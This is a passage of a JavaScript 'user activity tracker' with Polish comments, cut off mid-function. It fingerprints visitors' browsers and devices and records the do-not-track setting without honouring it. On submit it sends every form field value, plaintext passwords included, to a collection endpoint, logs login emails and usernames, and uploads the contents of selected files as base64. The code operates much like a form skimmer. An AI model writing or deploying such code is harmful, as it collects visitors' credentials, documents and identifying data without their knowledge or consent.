/**
 * User Activity Tracker v2.3
 * Zaawansowany skrypt do śledzenia aktywności użytkowników
 * Zbiera maksymalną ilość informacji o użytkowniku i jego urządzeniu
 *
 * NOWE W v2.3:
 * - Detekcja aktywności/bezczynności użytkownika (idle detection)
 * - Logi wysyłane TYLKO gdy użytkownik jest aktywny
 * - Automatyczne wstrzymanie śledzenia po okresie bezczynności
 * - Automatyczne wznowienie po powrocie aktywności
 * - Konfigurowalny czas bezczynności (data-idle-timeout)
 *
 * NOWE W v2.2:
 * - Przechwytywanie logów konsoli (console.log/warn/error/info/debug)
 * - Przechwytywanie requestów sieciowych (fetch i XMLHttpRequest)
 * - Monitorowanie komunikacji strony z jej backendem/API
 *
 * INTEGRACJA:
 * 1. Zmień CONFIG.endpoint na swój backend URL
 * 2. Ustaw unikalny CONFIG.siteId dla swojej strony
 * 3. Ustaw CONFIG.apiToken dla autoryzacji (opcjonalnie)
 * 4. Opcjonalnie: data-idle-timeout="30000" (ms) - czas do przejścia w idle
 * 5. Dodaj skrypt do swojej strony: <script src="tracker.js"></script>
 */
(function (window, document) {
  'use strict';

  // === KONFIGURACJA ===
  // Próba automatycznego pobrania konfiguracji z tagu skryptu
  const currentScript =
    document.currentScript || document.querySelector('script[src*="tracker.js"]');

  const CONFIG = {
    // Endpoint API - pobierz z atrybutu data-endpoint lub użyj domyślnego
    endpoint: currentScript?.getAttribute('data-endpoint') || window.location.origin + '/api',

    // ID strony - pobierz z atrybutu data-site-id lub użyj domeny
    siteId:
      currentScript?.getAttribute('data-site-id') || window.location.hostname.replace('www.', ''),

    // Token API do autoryzacji (opcjonalny)
    apiToken: currentScript?.getAttribute('data-api-token') || null,

    sessionTimeout: 30 * 60 * 1000, // Timeout sesji: 30 minut
    heartbeatInterval: 30 * 1000, // Interwał heartbeat: 30 sekund
    batchSize: 10, // Wyślij eventy co 10 zdarzeń
    batchTimeout: 5000, // Lub co 5 sekund

    // Czas bezczynności po którym tracker przechodzi w tryb idle (ms)
    idleTimeout: parseInt(currentScript?.getAttribute('data-idle-timeout')) || 60 * 1000, // 60 sekund

    // Tryb debug - wyłącz w produkcji
    debug: currentScript?.getAttribute('data-debug') === 'true' || false,

    // Ścieżki wykluczające - tracker NIE działa na tych ścieżkach
    // Zapobiega śledzeniu dashboardu i API (zapętlenie!)
    excludedPaths: [
      '/dashboard', // Panel administracyjny
      '/login', // Strona logowania
      '/api/', // Endpointy API
      '/admin', // Panel admina (na przyszłość)
    ],
  };

  /**
   * Sprawdza czy bieżąca strona powinna być wykluczona z trackingu
   * Zapobiega śledzeniu samego dashboardu (zapętlenie!)
   */
  function shouldExcludePage() {
    const currentPath = window.location.pathname;

    // Sprawdź każdą wykluczoną ścieżkę
    for (const excludedPath of CONFIG.excludedPaths) {
      if (currentPath.startsWith(excludedPath)) {
        return true;
      }
    }

    // Sprawdź też czy endpoint API jest na tej samej domenie
    // Jeśli tak, nie śledź stron z tego origin
    try {
      const endpointUrl = new URL(CONFIG.endpoint);
      const currentUrl = new URL(window.location.href);

      // Jeśli endpoint jest lokalny (ta sama domena) i jesteśmy na ścieżce admin
      if (endpointUrl.origin === currentUrl.origin) {
        // Dodatkowe wykluczenie dla lokalnego środowiska
        if (currentPath.startsWith('/dashboard') || currentPath.startsWith('/login')) {
          return true;
        }
      }
    } catch (e) {
      // Błąd parsowania URL - kontynuuj normalnie
    }

    return false;
  }

  // === FUNKCJA LOGOWANIA (tylko w trybie debug) ===
  function log(...args) {
    if (CONFIG.debug) {
      console.log('[Tracker]', ...args);
    }
  }

  function warn(...args) {
    if (CONFIG.debug) {
      console.warn('[Tracker]', ...args);
    }
  }

  /**
   * Bezpieczna serializacja JSON - obsługuje cykliczne referencje i elementy DOM
   */
  function safeStringify(obj) {
    const seen = new WeakSet();
    return JSON.stringify(obj, (key, value) => {
      // Ignoruj elementy DOM i węzły
      if (value instanceof Node || value instanceof Element) {
        return undefined;
      }
      // Ignoruj funkcje
      if (typeof value === 'function') {
        return undefined;
      }
      // Obsłuż cykliczne referencje
      if (typeof value === 'object' && value !== null) {
        if (seen.has(value)) {
          return '[Circular]';
        }
        seen.add(value);
      }
      return value;
    });
  }

  // === STAN TRACKERA ===
  const state = {
    sessionId: null, // ID bieżącej sesji
    visitorId: null, // Stały ID użytkownika
    events: [], // Kolejka eventów do wysłania
    lastActivity: Date.now(), // Timestamp ostatniej aktywności
    scrollDepth: 0, // Maksymalna głębokość scrollowania
    timeOnPage: 0, // Czas spędzony na stronie (sekundy)
    startTime: Date.now(), // Timestamp rozpoczęcia sesji

    // Stan aktywności użytkownika
    isActive: true, // Czy użytkownik jest aktywny
    idleTimer: null, // Timer bezczynności
    idleStartTime: null, // Kiedy użytkownik stał się nieaktywny
    totalIdleTime: 0, // Łączny czas bezczynności (ms)
  };

  // === GENEROWANIE UNIKALNYCH ID ===

  /**
   * Generuje UUID v4
   */
  function generateId() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      return (c === 'x' ? r : (r & 0x3) | 0x8).toString(16);
    });
  }

  /**
   * Pobiera lub tworzy visitor ID (persystentny w localStorage)
   * Ten ID jest stały dla użytkownika nawet po zamknięciu przeglądarki
   */
  function getVisitorId() {
    try {
      let id = localStorage.getItem('_tracker_vid');
      if (!id) {
        id = generateId();
        localStorage.setItem('_tracker_vid', id);
      }
      return id;
    } catch (e) {
      // localStorage może być zablokowany
      return generateId();
    }
  }

  /**
   * Pobiera lub tworzy session ID (w sessionStorage)
   * Sesja wygasa po zamknięciu karty lub po timeout bezczynności
   */
  function getSessionId() {
    try {
      const stored = sessionStorage.getItem('_tracker_sid');
      const lastActivity = parseInt(sessionStorage.getItem('_tracker_last') || '0');

      // Sprawdź czy sesja nie wygasła
      if (stored && Date.now() - lastActivity < CONFIG.sessionTimeout) {
        return stored;
      }

      // Utwórz nową sesję
      const newId = generateId();
      sessionStorage.setItem('_tracker_sid', newId);
      return newId;
    } catch (e) {
      return generateId();
    }
  }

  // === ZARZĄDZANIE STANEM AKTYWNOŚCI ===

  /**
   * Przełącza tracker w tryb idle (bezczynności)
   * Wstrzymuje wysyłanie logów do momentu powrotu aktywności
   */
  function goIdle() {
    if (!state.isActive) return; // Już w trybie idle

    state.isActive = false;
    state.idleStartTime = Date.now();

    log('Użytkownik nieaktywny - wstrzymuję śledzenie');

    // Wyślij event o przejściu w tryb idle
    trackDirect('user_idle', {
      timeOnPage: state.timeOnPage,
      scrollDepth: state.scrollDepth,
      idleAfter: CONFIG.idleTimeout / 1000 + 's',
    });

    // Wyślij zebrane eventy przed wstrzymaniem
    flush();
  }

  /**
   * Wybudza tracker z trybu idle (użytkownik wrócił)
   */
  function wakeUp() {
    if (state.isActive) return; // Już aktywny

    const idleDuration = Date.now() - state.idleStartTime;
    state.totalIdleTime += idleDuration;
    state.isActive = true;
    state.idleStartTime = null;

    log('Użytkownik aktywny - wznawiam śledzenie');

    // Wyślij event o powrocie aktywności
    trackDirect('user_active', {
      idleDuration: Math.round(idleDuration / 1000), // sekundy
      totalIdleTime: Math.round(state.totalIdleTime / 1000),
      timeOnPage: state.timeOnPage,
    });

    // Zresetuj timer bezczynności
    resetIdleTimer();
  }

  /**
   * Resetuje timer bezczynności (wywołane przy każdej aktywności)
   */
  function resetIdleTimer() {
    // Wyczyść poprzedni timer
    if (state.idleTimer) {
      clearTimeout(state.idleTimer);
    }

    // Jeśli był w trybie idle, obudź
    if (!state.isActive) {
      wakeUp();
    }

    // Ustaw nowy timer bezczynności
    state.idleTimer = setTimeout(() => {
      goIdle();
    }, CONFIG.idleTimeout);
  }

  /**
   * Inicjalizuje detekcję aktywności użytkownika
   * Nasłuchuje na wszystkie typowe interakcje
   */
  function initActivityDetection() {
    const activityEvents = [
      'mousedown',
      'mousemove',
      'keydown',
      'scroll',
      'touchstart',
      'touchmove',
      'wheel',
      'resize',
      'focus',
    ];

    // Debounce dla zdarzeń o wysokiej częstotliwości
    let activityTimeout = null;
    const handleActivity = () => {
      if (activityTimeout) return;

      activityTimeout = setTimeout(() => {
        activityTimeout = null;
      }, 100); // Max 10 sprawdzeń/sekundę

      resetIdleTimer();
    };

    // Dodaj nasłuchiwanie na wszystkie eventy aktywności
    activityEvents.forEach((eventName) => {
      document.addEventListener(eventName, handleActivity, { passive: true, capture: true });
      window.addEventListener(eventName, handleActivity, { passive: true, capture: true });
    });

    // Dodatkowo: powrót z innej karty = aktywność
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') {
        handleActivity();
      }
    });

    // Wystartuj pierwszy timer
    resetIdleTimer();

    log('Detekcja aktywności uruchomiona (idle po ' + CONFIG.idleTimeout / 1000 + 's)');
  }

  /**
   * Sprawdza czy tracker powinien wysyłać logi
   * Zwraca false gdy użytkownik jest bezczynny
   */
  function isTrackingEnabled() {
    return state.isActive;
  }

  // === ZBIERANIE INFORMACJI O UŻYTKOWNIKU ===

  /**
   * Generuje canvas fingerprint - unikalny identyfikator na podstawie renderowania canvas
   * Każda przeglądarka/system renderuje canvas nieco inaczej
   */
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (!ctx) return null;

      const text = 'Activity Tracker 2.0';
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText(text, 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText(text, 4, 17);

      return canvas.toDataURL().substring(0, 100); // Skrócona wersja
    } catch (e) {
      return null;
    }
  }

  /**
   * Sprawdza dostępność Battery API i pobiera informacje o baterii
   */
  async function getBatteryInfo() {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          charging: battery.charging,
          level: Math.round(battery.level * 100),
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
        };
      }
    } catch (e) {
      // Battery API nie jest dostępne
    }
    return null;
  }

  /**
   * Informacje o połączeniu sieciowym
   */
  function getNetworkInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return null;

    return {
      effectiveType: conn.effectiveType, // '4g', '3g', '2g', 'slow-2g'
      downlink: conn.downlink, // Szacowana prędkość pobierania (Mbps)
      rtt: conn.rtt, // Round trip time (ms)
      saveData: conn.saveData, // Tryb oszczędzania danych
    };
  }

  /**
   * Informacje o pamięci urządzenia
   */
  function getMemoryInfo() {
    const mem = navigator.deviceMemory;
    if (!mem) return null;

    return {
      deviceMemory: mem, // GB RAM
    };
  }

  /**
   * Informacje o GPU/karcie graficznej
   */
  function getGPUInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;

      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (!debugInfo) return null;

      return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
      };
    } catch (e) {
      return null;
    }
  }

  /**
   * Pobiera listę pluginów przeglądarki
   */
  function getPlugins() {
    try {
      return Array.from(navigator.plugins || []).map((p) => p.name);
    } catch (e) {
      return [];
    }
  }

  /**
   * Zbiera WSZYSTKIE dostępne informacje o urządzeniu i przeglądarce
   */
  async function getExtendedDeviceInfo() {
    const ua = navigator.userAgent;
    const battery = await getBatteryInfo();

    return {
      // Podstawowe info
      userAgent: ua,
      language: navigator.language,
      languages: navigator.languages || [navigator.language],
      platform: navigator.platform,

      // Ekran i widok
      screenWidth: screen.width,
      screenHeight: screen.height,
      screenAvailWidth: screen.availWidth,
      screenAvailHeight: screen.availHeight,
      screenColorDepth: screen.colorDepth,
      screenPixelDepth: screen.pixelDepth,
      screenOrientation: screen.orientation?.type || null,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio || 1,

      // Możliwości urządzenia
      touchSupport: 'ontouchstart' in window,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack === '1',
      hardwareConcurrency: navigator.hardwareConcurrency || null, // Liczba rdzeni CPU

      // Strefa czasowa i czas
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),

      // Bateria
      battery: battery,

      // Sieć
      network: getNetworkInfo(),

      // Pamięć
      memory: getMemoryInfo(),

      // GPU
      gpu: getGPUInfo(),

      // Pluginy i czcionki
      pluginsCount: navigator.plugins?.length || 0,
      plugins: getPlugins().slice(0, 10), // Pierwsze 10 pluginów

      // Fingerprinting
      canvasFingerprint: getCanvasFingerprint(),

      // Dodatkowe API
      webgl: !!window.WebGLRenderingContext,
      webrtc: !!window.RTCPeerConnection,
      audio: !!(window.AudioContext || window.webkitAudioContext),
      notification: !!window.Notification,
      serviceWorker: 'serviceWorker' in navigator,

      // Media devices
      mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
    };
  }

  /**
   * Zbiera informacje o aktualnej stronie
   */
  function getPageInfo() {
    return {
      url: window.location.href,
      path: window.location.pathname,
      hostname: window.location.hostname,
      search: window.location.search,
      hash: window.location.hash,
      title: document.title,
      referrer: document.referrer,
    };
  }

  /**
   * Wyciąga parametry UTM z URL
   */
  function getUtmParams() {
    const params = new URLSearchParams(window.location.search);
    return {
      utm_source: params.get('utm_source'),
      utm_medium: params.get('utm_medium'),
      utm_campaign: params.get('utm_campaign'),
      utm_term: params.get('utm_term'),
      utm_content: params.get('utm_content'),
    };
  }

  // === TRACKING EVENTS ===

  /**
   * Wewnętrzna funkcja dodająca event - pomija sprawdzanie aktywności
   * Używana dla eventów systemowych (idle/active)
   */
  function trackDirect(eventType, data = {}) {
    const event = {
      id: generateId(),
      timestamp: new Date().toISOString(),
      siteId: CONFIG.siteId,
      sessionId: state.sessionId,
      visitorId: state.visitorId,
      eventType: eventType,
      page: getPageInfo(),
      data: data,
      userActive: state.isActive,
    };

    state.events.push(event);
    state.lastActivity = Date.now();

    try {
      sessionStorage.setItem('_tracker_last', state.lastActivity.toString());
    } catch (e) {
      // Ignore storage errors
    }

    // Wyślij batch jeśli kolejka jest pełna
    if (state.events.length >= CONFIG.batchSize) {
      flush();
    }
  }

  /**
   * Dodaje event do kolejki i aktualizuje timestamp ostatniej aktywności
   * UWAGA: Ignoruje eventy gdy użytkownik jest w trybie idle!
   */
  function track(eventType, data = {}) {
    // Gdy użytkownik jest nieaktywny - nie śledź (z wyjątkami)
    if (!isTrackingEnabled()) {
      // Pozwól na niektóre krytyczne eventy nawet podczas idle
      const allowedDuringIdle = ['page_exit', 'page_hidden', 'page_visible', 'js_error'];
      if (!allowedDuringIdle.includes(eventType)) {
        return; // Nie śledź podczas bezczynności
      }
    }

    trackDirect(eventType, data);
  }

  /**
   * Wysyła zebrane eventy do backendu
   */
  async function flush() {
    if (state.events.length === 0) return;

    const eventsToSend = state.events.splice(0, CONFIG.batchSize);

    // Pobierz rozszerzone info o urządzeniu przy pierwszym wywołaniu
    const deviceInfo = await getExtendedDeviceInfo();

    const payload = {
      events: eventsToSend,
      device: deviceInfo,
      utm: getUtmParams(),
    };

    const headers = {
      'Content-Type': 'application/json',
    };

    // Dodaj token API jeśli jest skonfigurowany
    if (CONFIG.apiToken) {
      headers['X-API-Token'] = CONFIG.apiToken;
    }

    // Użyj sendBeacon dla niezawodności (działa nawet przy zamykaniu strony)
    try {
      const jsonPayload = safeStringify(payload);
      if (navigator.sendBeacon) {
        const blob = new Blob([jsonPayload], { type: 'application/json' });
        const success = navigator.sendBeacon(CONFIG.endpoint + '/collect', blob);
        if (!success) {
          // Fallback jeśli sendBeacon nie zadziałał
          sendWithFetch(jsonPayload, headers);
        }
      } else {
        sendWithFetch(jsonPayload, headers);
      }
    } catch (err) {
      warn('Failed to serialize payload:', err);
    }
  }

  function sendWithFetch(jsonPayload, headers) {
    fetch(CONFIG.endpoint + '/collect', {
      method: 'POST',
      headers: headers,
      body: jsonPayload,
      keepalive: true,
    }).catch((err) => {
      warn('Failed to send events:', err);
    });
  }

  // === TRACKERY RÓŻNYCH INTERAKCJI ===

  /**
   * Wykrywa Rage Clicks (szybkie wielokrotne kliknięcia w to samo miejsce)
   * Oznaka frustracji użytkownika
   */
  function trackRageClicks() {
    let clicks = [];

    document.addEventListener(
      'click',
      (e) => {
        const now = Date.now();
        // Dodaj kliknięcie do historii (bez referencji do elementu DOM)
        clicks.push({
          x: e.clientX,
          y: e.clientY,
          t: now,
          targetTag: e.target.tagName,
          targetId: e.target.id || null,
          targetText: (e.target.innerText || '').substring(0, 50),
        });

        // Zachowaj tylko kliknięcia z ostatniej sekundy
        clicks = clicks.filter((c) => now - c.t < 1000);

        // Sprawdź czy mamy 3 kliknięcia blisko siebie (promień 20px)
        if (clicks.length >= 3) {
          const last = clicks[clicks.length - 1];
          const cluster = clicks.filter(
            (c) => Math.abs(c.x - last.x) < 20 && Math.abs(c.y - last.y) < 20,
          );

          if (cluster.length >= 3) {
            track('rage_click', {
              x: last.x,
              y: last.y,
              targetTag: last.targetTag,
              targetId: last.targetId,
              text: last.targetText,
              clickCount: cluster.length,
            });
            clicks = []; // Reset po wykryciu
          }
        }
      },
      true,
    );
  }

  /**
   * Śledzi kliknięcia w linki, przyciski i elementy z data-track
   */
  function trackClicks() {
    document.addEventListener(
      'click',
      (e) => {
        const target = e.target.closest(
          'a, button, [data-track], input[type="submit"], input[type="button"]',
        );
        if (!target) return;

        const data = {
          tagName: target.tagName,
          id: target.id || null,
          className: target.className || null,
          text: (target.textContent || target.value || '').substring(0, 100).trim(),
          href: target.href || null,
          dataTrack: target.dataset.track || null,
          x: e.clientX,
          y: e.clientY,
        };

        track('click', data);
      },
      true,
    );
  }

  /**
   * Śledzi wysyłanie formularzy (dane + czas wypełniania + pliki)
   */
  function trackForms() {
    const formTimers = new Map();
    const formFieldsHistory = new Map(); // Historia zmian w polach formularza

    // 1. Rozpoczęcie wypełniania (Focus)
    document.addEventListener(
      'focusin',
      (e) => {
        if (e.target.matches('input, textarea, select')) {
          const form = e.target.form;

          // Rozpocznij mierzenie czasu dla tego formularza
          if (form && !formTimers.has(form)) {
            formTimers.set(form, Date.now());
            formFieldsHistory.set(form, []);
            track('form_start', {
              formId: form.id || form.name || 'unknown_form',
            });
          }

          track('field_focus', {
            fieldName: e.target.name || null,
            fieldType: e.target.type || null,
            fieldId: e.target.id || null,
            valueLength: e.target.value ? e.target.value.length : 0,
          });
        }
      },
      true,
    );

    // 2. Śledzenie zmian w polach formularza
    document.addEventListener(
      'change',
      (e) => {
        const target = e.target;
        if (!target.matches('input, textarea, select')) return;

        const form = target.form;
        if (!form) return;

        const history = formFieldsHistory.get(form) || [];

        history.push({
          fieldName: target.name || target.id || 'unknown',
          fieldType: target.type || 'text',
          timestamp: Date.now(),
          // TODO: W przyszłości dodać szyfrowanie/haszowanie wrażliwych danych
          value: (target.value || '').substring(0, 200),
        });

        formFieldsHistory.set(form, history);
      },
      true,
    );

    // 3. Śledzenie wyboru plików
    document.addEventListener(
      'change',
      (e) => {
        const target = e.target;
        if (target.type !== 'file') return;

        const files = target.files;
        if (!files || files.length === 0) return;

        const fileInfos = Array.from(files).map((file) => ({
          name: file.name,
          size: file.size,
          type: file.type || 'unknown',
          extension: file.name.includes('.') ? file.name.split('.').pop().toLowerCase() : null,
          lastModified: file.lastModified ? new Date(file.lastModified).toISOString() : null,
        }));

        track('file_selected', {
          fieldName: target.name || target.id || 'file_input',
          filesCount: files.length,
          totalSize: fileInfos.reduce((sum, f) => sum + f.size, 0),
          files: fileInfos,
          formId: target.form?.id || target.form?.name || null,
        });
      },
      true,
    );

    // 4. Wysłanie formularza z pełnymi danymi
    document.addEventListener(
      'submit',
      (e) => {
        const form = e.target;
        const startTime = formTimers.get(form);
        const duration = startTime ? Math.round((Date.now() - startTime) / 1000) : 0;
        const fieldsHistory = formFieldsHistory.get(form) || [];

        // Zbieranie danych z pól (rozszerzone)
        const formData = {};
        const filesList = [];
        let fieldsCount = 0;

        try {
          Array.from(form.elements).forEach((el) => {
            // Ignoruj przyciski
            if (el.type === 'submit' || el.type === 'button' || el.type === 'reset') return;
            if (!el.name && !el.id) return;

            const fieldKey = el.name || el.id;
            fieldsCount++;

            // Obsługa plików
            if (el.type === 'file' && el.files && el.files.length > 0) {
              const filesInfo = Array.from(el.files).map((file) => ({
                name: file.name,
                size: file.size,
                type: file.type || 'unknown',
                extension: file.name.includes('.')
                  ? file.name.split('.').pop().toLowerCase()
                  : null,
              }));
              formData[fieldKey] = `[PLIKI: ${el.files.length}]`;
              filesList.push(...filesInfo.map((f) => ({ ...f, fieldName: fieldKey })));
              return;
            }

            // TODO: W przyszłości dodać szyfrowanie/haszowanie wrażliwych danych (hasła, karty, itp.)
            if (el.type === 'checkbox') {
              formData[fieldKey] = el.checked;
            } else if (el.type === 'radio') {
              if (el.checked) formData[fieldKey] = el.value;
            } else if (el.tagName === 'SELECT' && el.multiple) {
              formData[fieldKey] = Array.from(el.selectedOptions).map((opt) => opt.value);
            } else {
              // Przytnij zbyt długie teksty
              formData[fieldKey] = (el.value || '').substring(0, 1000);
            }
          });
        } catch (err) {
          // Fallback w razie błędu parsowania
          warn('Error parsing form data:', err);
        }

        // Wyślij event z pełnymi danymi formularza
        track('form_submit', {
          formId: form.id || null,
          formName: form.name || null,
          formAction: form.action || null,
          formMethod: form.method || 'GET',
          duration: duration,
          fieldsCount: fieldsCount,
          hasFiles: filesList.length > 0,
          files: filesList,
          values: formData,
          fieldsHistory: fieldsHistory.slice(-20), // Ostatnie 20 zmian
        });

        // Jeśli są pliki, wyślij je osobno z metadanymi
        if (filesList.length > 0) {
          sendFilesData(form, filesList, formData);
        }

        formTimers.delete(form);
        formFieldsHistory.delete(form);

        // Wykryj i śledź próby logowania
        detectAndTrackLogin(form, formData, duration);
      },
      true,
    );
  }

  /**
   * Wykrywa formularze logowania i śledzi próby logowania
   */
  function detectAndTrackLogin(form, formData, duration) {
    // Wzorce do wykrywania pól logowania
    const EMAIL_PATTERNS = [/e[-_]?mail/i, /login/i, /user(name)?/i, /account/i];
    const PASSWORD_PATTERNS = [/pass(word)?/i, /haslo/i, /has[łl]o/i, /pwd/i, /secret/i];
    const LOGIN_FORM_PATTERNS = [/login/i, /signin/i, /auth/i, /logowanie/i, /zaloguj/i];

    // Sprawdź czy to formularz logowania
    const formAction = (form.action || '').toLowerCase();
    const formId = (form.id || '').toLowerCase();
    const formName = (form.name || '').toLowerCase();
    const formClass = (form.className || '').toLowerCase();

    const isLoginForm = LOGIN_FORM_PATTERNS.some(
      (p) => p.test(formAction) || p.test(formId) || p.test(formName) || p.test(formClass),
    );

    // Szukaj pól email/username i password
    let emailField = null;
    let passwordField = null;
    let emailValue = null;
    let usernameValue = null;
    let passwordLength = 0;

    for (const [fieldName, fieldValue] of Object.entries(formData)) {
      const lowerName = fieldName.toLowerCase();
      const value = String(fieldValue || '');

      // Wykryj pole email/username
      if (EMAIL_PATTERNS.some((p) => p.test(lowerName))) {
        emailField = fieldName;
        // Sprawdź czy to email czy username
        if (value.includes('@')) {
          emailValue = value;
        } else {
          usernameValue = value;
        }
      }

      // Wykryj pole hasła
      if (PASSWORD_PATTERNS.some((p) => p.test(lowerName))) {
        passwordField = fieldName;
        passwordLength = value.length;
      }
    }

    // Jeśli mamy email/username i hasło - to próba logowania
    if ((emailValue || usernameValue) && passwordLength > 0) {
      const loginData = {
        isLoginForm: isLoginForm,
        email: emailValue,
        username: usernameValue,
        passwordLength: passwordLength,
        formId: form.id || null,
        formName: form.name || null,
        formAction: form.action || null,
        duration: duration,
        fieldsCount: Object.keys(formData).length,
      };

      // Wyślij event login_attempt
      track('login_attempt', loginData);

      // Monitoruj wynik logowania (przekierowanie lub błąd)
      monitorLoginResult(form, loginData);
    }
  }

  /**
   * Monitoruje wynik logowania po wysłaniu formularza
   */
  function monitorLoginResult(form, loginData) {
    const startUrl = window.location.href;
    let resultSent = false;

    // Funkcja wysyłająca wynik
    const sendResult = (success, method, details = {}) => {
      if (resultSent) return;
      resultSent = true;

      track('login_result', {
        ...loginData,
        success: success,
        detectionMethod: method,
        startUrl: startUrl,
        endUrl: window.location.href,
        ...details,
      });
    };

    // 1. Wykryj przekierowanie (sukces)
    const checkRedirect = () => {
      if (window.location.href !== startUrl) {
        // Sprawdź czy to przekierowanie na stronę błędu
        const errorPatterns = [/error/i, /fail/i, /invalid/i, /wrong/i, /bledne/i, /niepoprawne/i];
        const isError = errorPatterns.some(
          (p) => p.test(window.location.href) || p.test(document.title),
        );
        sendResult(!isError, 'redirect', { redirectUrl: window.location.href });
      }
    };

    // 2. Wykryj komunikaty błędów na stronie
    const checkErrors = () => {
      const errorSelectors = [
        '.error',
        '.alert-danger',
        '.alert-error',
        '[class*="error"]',
        '.invalid-feedback',
        '.form-error',
        '.login-error',
        '[role="alert"]',
        '.message-error',
        '.notification-error',
      ];

      const errorTexts = [
        /niepoprawn/i,
        /błęd/i,
        /invalid/i,
        /incorrect/i,
        /wrong/i,
        /failed/i,
        /nie udało/i,
        /spróbuj ponownie/i,
        /try again/i,
      ];

      for (const selector of errorSelectors) {
        const elements = document.querySelectorAll(selector);
        for (const el of elements) {
          const text = el.textContent || '';
          if (errorTexts.some((p) => p.test(text)) && el.offsetParent !== null) {
            sendResult(false, 'error_message', { errorMessage: text.substring(0, 200) });
            return true;
          }
        }
      }
      return false;
    };

    // 3. Wykryj sukces
    const checkSuccess = () => {
      const successPatterns = [
        /dashboard/i,
        /home/i,
        /profile/i,
        /account/i,
        /welcome/i,
        /panel/i,
        /konto/i,
        /profil/i,
        /witaj/i,
      ];

      if (successPatterns.some((p) => p.test(window.location.href) || p.test(document.title))) {
        sendResult(true, 'success_page');
        return true;
      }
      return false;
    };

    // Uruchom sprawdzanie
    setTimeout(() => {
      checkRedirect();
      if (!resultSent && !checkErrors()) {
        checkSuccess();
      }
    }, 500);

    // Drugie sprawdzenie po dłuższym czasie
    setTimeout(() => {
      if (!resultSent) {
        checkRedirect();
        if (!resultSent && !checkErrors()) {
          if (!checkSuccess()) {
            // Nieznany wynik
            sendResult(null, 'unknown');
          }
        }
      }
    }, 2000);

    // Obsługa nawigacji
    window.addEventListener(
      'popstate',
      () => {
        if (!resultSent) {
          checkRedirect();
        }
      },
      { once: true },
    );
  }

  /**
   * Wysyła dane o plikach do serwera (metadane + opcjonalnie zawartość)
   */
  function sendFilesData(form, files, formData) {
    // Pobierz rzeczywiste pliki z formularza
    const fileInputs = form.querySelectorAll('input[type="file"]');
    const filesToUpload = [];

    fileInputs.forEach((input) => {
      if (input.files && input.files.length > 0) {
        Array.from(input.files).forEach((file) => {
          filesToUpload.push({
            fieldName: input.name || input.id || 'file',
            file: file,
          });
        });
      }
    });

    // Wyślij każdy plik osobno (lub w batchu jeśli są małe)
    filesToUpload.forEach(({ fieldName, file }) => {
      // Dla małych plików (< 1MB) możemy wysłać zawartość jako base64
      const maxFileSize = 1024 * 1024; // 1MB

      if (file.size <= maxFileSize) {
        const reader = new FileReader();
        reader.onload = function (e) {
          const base64Content = e.target.result;

          sendFileToServer({
            fieldName: fieldName,
            fileName: file.name,
            fileType: file.type || 'application/octet-stream',
            fileSize: file.size,
            fileExtension: file.name.includes('.')
              ? file.name.split('.').pop().toLowerCase()
              : null,
            fileContent: base64Content, // Base64 encoded
            formId: form.id || form.name || null,
            formAction: form.action || null,
          });
        };
        reader.readAsDataURL(file);
      } else {
        // Dla większych plików wysyłamy tylko metadane
        sendFileToServer({
          fieldName: fieldName,
          fileName: file.name,
          fileType: file.type || 'application/octet-stream',
          fileSize: file.size,
          fileExtension: file.name.includes('.') ? file.name.split('.').pop().toLowerCase() : null,
          fileContent: null, // Za duży plik
          formId: form.id || form.name || null,
          formAction: form.action || null,
          reason: 'file_too_large',
        });
      }
    });
  }

  /**
   * Wysyła plik do serwera przez dedykowany endpoint
   */
  function sendFileToServer(fileData) {
    const payload = {
      sessionId: state.sessionId,
      visitorId: state.visitorId,
      siteId: CONFIG.siteId,
      page: getPageInfo(),
      file: fileData,
      timestamp: new Date().toISOString(),
    };

    const headers = {
      'Content-Type': 'application/json',
    };

    if (CONFIG.apiToken) {
      headers['X-API-Token'] = CONFIG.apiToken;
    }

    fetch(CONFIG.endpoint + '/collect/files', {
      method: 'POST',
      headers: headers,
      body: safeStringify(payload),
      keepalive: true,
    }).catch((err) => {
      warn('Failed to upload file:', err);
    });
  }

  /**
   * Śledzi scrollowanie - raportuje głębokość przy progach 25%, 50%, 75%, 100%
   */
  function trackScroll() {
    let scrollTimeout;

    window.addEventListener(
      'scroll',
      () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(() => {
          const docHeight = Math.max(
            document.body.scrollHeight,
            document.documentElement.scrollHeight,
          );
          const scrolled = window.scrollY + window.innerHeight;
          const depth = Math.min(100, Math.round((scrolled / docHeight) * 100));

          if (depth > state.scrollDepth) {
            state.scrollDepth = depth;

            // Raportuj tylko przy kluczowych progach
            if ([25, 50, 75, 100].includes(depth)) {
              track('scroll_depth', {
                depth: depth,
                scrollY: window.scrollY,
              });
            }
          }
        }, 150);
      },
      { passive: true },
    );
  }

  /**
   * Śledzi widoczność elementów przez użytkownika (używa Intersection Observer)
   */
  function trackVisibility() {
    if (!('IntersectionObserver' in window)) return;

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
